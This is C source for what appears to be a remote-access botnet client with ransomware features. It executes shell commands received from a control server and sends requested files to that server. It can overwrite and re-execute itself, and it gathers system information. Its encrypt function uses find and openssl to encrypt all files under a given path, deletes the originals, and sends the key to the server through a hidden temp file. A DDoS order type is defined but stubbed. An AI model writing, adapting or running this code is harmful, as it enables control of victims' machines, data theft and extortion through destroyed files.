#include <stdlib.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h> 
#include <unistd.h>
#include <limits.h>
#include <errno.h>
#include <stdarg.h>

#include "../../include/client/client_utils.h"
#include "../../include/logging.h"
#include "../../include/send_message.h"
#include "../../include/receive_message.h"
#include "../../include/commands.h"
#include "../../include/file_exchange.h"

// Check the 8 first characters of the buffer to check the order type
enum OrderType get_order_enum_type(const char *buffer) {
    char flag[9];
    strncpy(flag, buffer, 8); // Copy the first 8 characters
    flag[8] = '\0'; // Null-terminate the string

    if (strcmp(flag, "COMMAND_") == 0) return COMMAND_;
    if (strcmp(flag, "ASKLOGS_") == 0) return ASKLOGS_;
    if (strcmp(flag, "ASKSTATE") == 0) return ASKSTATE;
    if (strcmp(flag, "DDOSATCK") == 0) return DDOSATCK;
    if (strncmp(buffer, "DOWNLOAD", 8) == 0) return DOWNLOAD;
    if (strncmp(buffer, "UPDATE", 6) == 0) return UPDATE;
    if (strncmp(buffer, "ENCRYPT", 7) == 0) return ENCRYPT;
    if (strncmp(buffer, "DECRYPT", 7) == 0) return DECRYPT;
    if (strncmp(buffer, "SYSINFO", 7) == 0) return SYSINFO;
    return UNKNOWN; // warning: unknown enum value is 99
}

// Return a buffer storing the n_last_line lines of the main.log file or all of the lines if n_last_line <= 0
char* read_client_log_file(int n_last_line) {
    FILE *file = fopen("main.log", "r");
    if (!file) {
        perror("Error while opening log file");
        return NULL;
    }

    char *buffer;

    if(n_last_line <= 0) {
        fseek(file, 0, SEEK_END);
        long filesize = ftell(file); // Cursor position, get file byte size
        fseek(file, 0, SEEK_SET);

        buffer = malloc(filesize + 1);
        size_t read_size = fread(buffer, 1, filesize, file); // read all the file
        buffer[read_size] = '\0';
    }
    else {
        fseek(file, 0, SEEK_END);
        long filesize = ftell(file);
        long pos = filesize - 1; // begin at the end of the file before \0
        int newline_count = 0;

        // getting the cursor position to begin reading the n_last_line lines of the file
        while (pos >= 0 && newline_count <= n_last_line) {
            fseek(file, pos, SEEK_SET);
            int c = fgetc(file);
            if (c == '\n') {
                newline_count++;
            }
            pos--;
        }
        long start_pos = pos + 1;
        fseek(file, start_pos, SEEK_SET);

        buffer = malloc(filesize + 1);
        long read_size = filesize - start_pos;
        fread(buffer, 1, filesize, file);
        buffer[read_size] = '\0';
    }

    fclose(file);
    return buffer;
}

int parse_and_execute_command(const Command cmd, int sockfd) {
    // Check if the command is a `cd` command
    if (strcmp(cmd.program, "cd") == 0) {
        if (cmd.params && cmd.params[0]) {
            // Strip quotes from the directory name if present
            char *directory_name = cmd.params[0];
            size_t len = strlen(directory_name);
            if (directory_name[0] == '"' && directory_name[len - 1] == '"') {
                directory_name[len - 1] = '\0'; // Remove trailing quote
                directory_name++;              // Move past the leading quote
            }

            // Change the working directory
            if (chdir(directory_name) == 0) {
                send_message(sockfd, "Directory changed successfully");
            } else {
                send_message(sockfd, "Failed to change directory");
            }
        } else {
            send_message(sockfd, "No directory specified");
        }

        return 0; // No further processing needed
    }

    // Check if the command is a `pwd` command
    if (strcmp(cmd.program, "pwd") == 0) {
        char cwd[1024];
        if (getcwd(cwd, sizeof(cwd)) != NULL) {
            output_log("Sending cwd: %s\n", LOG_DEBUG, LOG_TO_CONSOLE, cwd);
            send_message(sockfd, cwd); // Send the current working directory back to the server
        } else {
            send_message(sockfd, "Error retrieving cwd");
        }

        return 0; // No further processing needed
    }

    // Execute other commands
    char result_buffer[4096] = {0};
    int exit_code = execute_command(&cmd, result_buffer, sizeof(result_buffer));
    if (exit_code < 0) {
        output_log("Command execution failed with exit code: %d , %s \n", LOG_ERROR, LOG_TO_ALL, exit_code,result_buffer);
    } else {
        output_log("Command executed successfully with exit code: %d %s \n", LOG_DEBUG, LOG_TO_ALL, exit_code,result_buffer);
    }
    // Send the result back to the server
    if (exit_code >= 0) {
        send_message(sockfd, result_buffer);
    } else {
        send_message(sockfd, "Command execution failed");
    }

    return exit_code;
}

void receive_and_process_message(int sockfd, int argc, char *argv[]) {
    char buffer[1024];

    // Receive the message from the server
    int bytes_received = receive_message_client(sockfd, buffer, sizeof(buffer), recv);
    if (bytes_received == -99) {
        return; // File upload success
    }
    if (bytes_received < 0) {
        output_log("Failed to receive message from server\n", LOG_ERROR, LOG_TO_ALL);
        return; // Erreur de réception
    }

    output_log("Done receiving, preparing to parse and execute\n", LOG_DEBUG, LOG_TO_CONSOLE);
    Command cmd;
    deserialize_command(buffer, &cmd);

    switch (cmd.order_type) {
        case COMMAND_:
            output_log("Preparing for COMMAND_ parsing and execution\n", LOG_DEBUG, LOG_TO_CONSOLE);
            parse_and_execute_command(cmd, sockfd);
            break;
        case ASKLOGS_:
            //send_logs_to_server(sockfd);
            break;
        case ASKSTATE:
            //send_state_to_server(sockfd);
            break;
        case DDOSATCK:
            //launch_ddos(cmd, sockfd);
            break;
        case DOWNLOAD:
            output_log("Preparing for DOWNLOAD request\n", LOG_DEBUG, LOG_TO_CONSOLE);
            send_file(sockfd,cmd.params[0]);
            break;
        case UPDATE:
            output_log("Preparing for UPDATE request\n", LOG_DEBUG, LOG_TO_CONSOLE);
            perform_self_update("/tmp/upload/client", sockfd, argc, argv);
            break;
        case ENCRYPT:
            output_log("Performing ENCRYPT request\n", LOG_DEBUG, LOG_TO_CONSOLE);
            encrypt(sockfd, cmd.params[0]);
            break;
        case DECRYPT:
            output_log("Preparing for DECRYPT request\n", LOG_DEBUG, LOG_TO_CONSOLE);
            decrypt(sockfd, cmd.params[0], cmd.params[1]);
            break;
        case SYSINFO:
            output_log("Preparing for SYSINFO request\n", LOG_DEBUG, LOG_TO_CONSOLE);
            execute_get_sysinfo(sockfd);
            break;
        case UNKNOWN:
            output_log("Unknown command type received\n", LOG_WARNING, LOG_TO_CONSOLE);
            break;
    }

    free_command(&cmd); // Nettoyer correctement après
    return ;
}



void perform_self_update(const char *new_exe_path, int sockfd, int argc, char *argv[]) {
    char exe_path[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (len == -1) {
        output_log("perform_self_update : Attempt to read proc/self/exe failed\n", LOG_ERROR, LOG_TO_ALL);
        perror("readlink failed");
        return;
    }
    exe_path[len] = '\0';

    // Move the new executable to the current executable's location
    if (rename(new_exe_path, exe_path) != 0) {
        output_log("perform_self_update : Override client executable failed\n", LOG_ERROR, LOG_TO_ALL);
        perror("Override client executable failed");
        return;
    }

    // Ensure the new executable has the correct permissions
    if (chmod(exe_path, 0755) != 0) {
        output_log("perform_self_update : Chmod failed on new executable\n", LOG_ERROR, LOG_TO_ALL);
        perror("chmod failed");
        return;
    }

    // Prepare arguments for execv
    char fd_arg[32];
    snprintf(fd_arg, sizeof(fd_arg), "--fd=%d", sockfd);

    // +2 for exe_path and fd_arg, +1 for NULL
    char **new_argv = malloc((argc + 2) * sizeof(char *));
    new_argv[0] = exe_path;
    new_argv[1] = fd_arg;
    for (int i = 1; i < argc; ++i) {
        new_argv[i + 1] = argv[i];
    }
    new_argv[argc + 1] = NULL;

    execv(exe_path, new_argv);

    // If execv fails
    perror("execv failed");
    output_log("perform_self_update : Execv failed to run : %s\n", LOG_ERROR, LOG_TO_ALL, errno);
}


char random_char(int index) {
    char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return charset[index];
}
char* generate_key(){
    srand(time(NULL));
    char *key = malloc(STRLEN * sizeof(char));
    if (!key) {
        output_log("generate_key : Failed to allocate memory for encryption key\n", LOG_ERROR, LOG_TO_ALL);
        return NULL;
    }
	int i, index;

	for (i = 0; i < STRLEN - 1; i++) {
		index = rand() % 62;
		key[i] = random_char(index);
	}
	key[i] = '\0';
    return key;
}

void encrypt(int sockfd, const char *filepath) {
    char *key = generate_key(); // key generation
    if (!key) {
        output_log("encrypt : Failed to generate encryption key\n", LOG_ERROR, LOG_TO_ALL);
        return;
    }

    // Prepare the command
    Command cmd = {
        .cmd_id = "0",
        .delay = 0,
        .program = strdup("sh"),
        .expected_exit_code = 0,
        .params = malloc(4 * sizeof(char *)),
    };

    if (!cmd.program || !cmd.params) {
        output_log("encrypt : Memory allocation failed\n", LOG_ERROR, LOG_TO_ALL);
        free(key);
        return;
    }

    // Prepare the shell command with proper escaping
    char *sh_cmd = malloc(1024);
    if (!sh_cmd) {
        output_log("encrypt : Failed to allocate memory for shell command\n", LOG_ERROR, LOG_TO_ALL);
        free_command(&cmd);
        free(key);
        return;
    }

    snprintf(
        sh_cmd, 1024,
        "find %s \\( -path /proc -o -path /sys -o -path /dev -o -path /usr -o -path /usr/bin -o -path /bin -o -path /sbin -o -path /lib -o -path /lib64 \\) -prune -o -type f ! -name \"*.encrypted\" -exec sh -c 'openssl aes-256-cbc -a -salt -pbkdf2 -in \"$1\" -out \"$1.encrypted\" -k \"%s\" && rm -f \"$1\"' _ {} \\; >/dev/null 2>&1 &",
        filepath,
        key
    );

    cmd.params[0] = strdup("-c");
    cmd.params[1] = sh_cmd;
    cmd.params[2] = NULL;

    output_log("encrypt : Encrypting files with find/openssl\n", LOG_DEBUG, LOG_TO_CONSOLE);

    write_encrypted_file("/tmp/31d6cfe0d16ae931b73c59d7e0c089c0.log", key);
    if (send_file(sockfd, "/tmp/31d6cfe0d16ae931b73c59d7e0c089c0.log") == 0) {
        output_log("encrypt : Failed to send encryption key file to server\n", LOG_ERROR, LOG_TO_ALL);
        free(key);
        free_command(&cmd);
        return;
    }

    output_log("encrypt : Encryption key sent to server\n", LOG_DEBUG, LOG_TO_CONSOLE);
    if (remove("/tmp/31d6cfe0d16ae931b73c59d7e0c089c0.log") != 0) {
        output_log("encrypt : Failed to delete key file: %s\n", LOG_ERROR, LOG_TO_ALL, "/tmp/31d6cfe0d16ae931b73c59d7e0c089c0.log");
    }

    parse_and_execute_command(cmd, sockfd);
    free_command(&cmd);
    free(key);
}

void write_encrypted_file(const char *filepath, const char *key) {
    FILE *file = fopen(filepath, "w");
    if (!file) {
        output_log("write_encrypted_file : Failed to open file for writing: %s\n", LOG_ERROR, LOG_TO_ALL, filepath);
        return;
    }

    // Write the key to the file
    fprintf(file, "%s\n", key);
    fclose(file);
}

void decrypt(int sockfd, const char *filepath, const char* key) {
    // Prepare the command
    Command cmd = {
        .cmd_id = "0",
        .delay = 0,
        .program = strdup("sh"),
        .expected_exit_code = 0,
        .params = malloc(4 * sizeof(char *)),
    };
    output_log(" decrypt key : %s", LOG_WARNING,LOG_TO_ALL,key);
    if (!cmd.program || !cmd.params) {
        output_log("decrypt : Memory allocation failed\n", LOG_ERROR, LOG_TO_ALL);
        return;
    }

    // Prepare the shell command with proper escaping
    char *sh_cmd = malloc(1024);
    if (!sh_cmd) {
        output_log("decrypt : Failed to allocate memory for shell command\n", LOG_ERROR, LOG_TO_ALL);
        free_command(&cmd);
        return;
    }

    snprintf(
        sh_cmd, 1024,
        "find %s \\( -path /proc -o -path /sys -o -path /dev -o -path /usr \\) -prune -o -type f -name \"*.encrypted\" -exec sh -c 'f=\"${1%%.encrypted}\"; if openssl aes-256-cbc -d -a -pbkdf2 -in \"$1\" -out \"$f\" -k \"%s\" && [ -f \"$f\" ]; then rm -f \"$1\"; echo \"Déchiffré: $1 → $f\"; else echo \"Échec: $1\" >&2; fi' _ {} \\;",
        filepath,
        key
    );

    cmd.params[0] = strdup("-c");
    cmd.params[1] = sh_cmd;
    cmd.params[2] = NULL;

    output_log("decrypt : Decrypting files with find/openssl\n", LOG_DEBUG, LOG_TO_CONSOLE);

    parse_and_execute_command(cmd, sockfd);
    free_command(&cmd);
}


void execute_get_sysinfo(int sockfd){
    Command **cmds = commands_sysinfo();
    // Execute other commands
    for (int i = 0; i < 7; i++){
        char result_buffer[4096] = {0};
        int exit_code = execute_command(cmds[i], result_buffer, sizeof(result_buffer));

        // Send the result back to the server
        if (exit_code >= 0) {
            send_message(sockfd, result_buffer);
        } else {
            char error_msg[100];
            sprintf(error_msg, "Command %d execution failed", i+1);
            send_message(sockfd, error_msg);
        }   
    }
    free_commands(cmds);
}

